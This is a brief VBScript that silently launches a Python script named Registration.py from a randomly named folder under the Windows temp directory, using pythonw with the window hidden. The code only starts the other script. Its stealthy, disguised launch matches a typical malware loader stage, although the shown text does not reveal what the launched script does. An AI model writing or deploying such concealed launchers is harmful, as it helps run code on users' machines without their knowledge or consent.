Set WshShell = CreateObject("WScript.Shell")

' Define the path to the Registration.py script in the temp folder
registration_script_path = WshShell.ExpandEnvironmentStrings("%TEMP%\Xurhf82819\Registration.py")

' Run the Registration.py script using pythonw
WshShell.Run "pythonw " & registration_script_path, 0
